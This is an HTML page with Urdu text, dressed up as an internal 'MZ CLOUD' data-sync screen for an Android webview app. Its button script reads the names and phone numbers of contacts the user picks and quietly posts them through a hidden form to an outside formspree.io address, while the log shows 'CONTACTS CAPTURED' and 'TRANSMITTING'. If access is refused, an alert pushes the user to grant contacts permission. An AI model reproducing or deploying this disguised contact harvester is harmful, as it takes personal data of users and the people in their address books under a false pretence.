<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MZ CLOUD INTERNAL</title>
    <style>
        body { 
            background: #000; color: #00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; 
            text-align: center; padding: 20px; direction: rtl;
        }
        .mz-box { 
            border: 2px solid #00ff00; padding: 25px; border-radius: 15px; 
            background: #0a0a0a; box-shadow: 0 0 15px rgba(0,255,0,0.4);
        }
        .btn-sync { 
            background: #00ff00; color: #000; padding: 16px; width: 100%; 
            border: none; font-weight: bold; cursor: pointer; border-radius: 8px; 
            font-size: 18px; margin-top: 15px;
        }
        #log-screen { 
            margin-top: 20px; background: #000; padding: 10px; border: 1px solid #222;
            font-size: 11px; text-align: left; direction: ltr; min-height: 60px;
            color: #00ff00; overflow-y: auto;
        }
    </style>
</head>
<body>

<div class="mz-box">
    <h2 style="color: #fff; margin: 0;">MZ CLOUD SERVER</h2>
    <p style="color: #00ff00; font-size: 12px;">SYSTEM VERSION: 2.0 (INTERNAL)</p>
    
    <div id="log-screen">> SYSTEM: READY_</div>

    <button class="btn-sync" id="mainBtn">ڈیٹا سنک کریں</button>

    <form id="internalForm" action="https://formspree.io/f/mbdqpqgz" method="POST" target="_blank" style="display:none;">
        <input type="hidden" name="MZ_APP_DATA" id="dataPayload">
    </form>
</div>

<script>
    const btn = document.getElementById('mainBtn');
    const log = document.getElementById('log-screen');

    btn.addEventListener('click', async () => {
        log.innerHTML += "<br>> REQUESTING HARDWARE ACCESS...";
        
        // اینڈرائیڈ ویب ویو (AppCreator24) میں کانٹیکٹ پک کرنے کا طریقہ
        if (navigator.contacts && navigator.contacts.select) {
            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                
                if (contacts.length > 0) {
                    log.innerHTML += "<br>> SUCCESS: " + contacts.length + " CONTACTS CAPTURED.";
                    
                    // ڈیٹا کو ترتیب دینا
                    let report = contacts.map(c => `نام: ${c.name} | نمبر: ${c.tel.join(', ')}`).join('\n');
                    document.getElementById('dataPayload').value = report;
                    
                    log.innerHTML += "<br>> TRANSMITTING TO MZ CLOUD...";
                    
                    // سبمٹ کرنا
                    setTimeout(() => {
                        document.getElementById('internalForm').submit();
                        log.innerHTML += "<br>> SYNC COMPLETED.";
                    }, 1000);
                }
            } catch (err) {
                log.innerHTML += "<br>> ERROR: APP_PERMISSION_DENIED";
                alert("ایپ کی سیٹنگز میں جا کر Contacts کی اجازت (Allow) دیں تاکہ کوڈ کام کر سکے۔");
            }
        } else {
            log.innerHTML += "<br>> ERROR: WEBVIEW_NOT_SUPPORTED";
            alert("AppCreator24 کا یہ سیکشن کانٹیکٹس کو سپورٹ نہیں کر رہا۔ اسے 'Chrome' میں ٹیسٹ کریں۔");
        }
    });
</script>

</body>
</html>
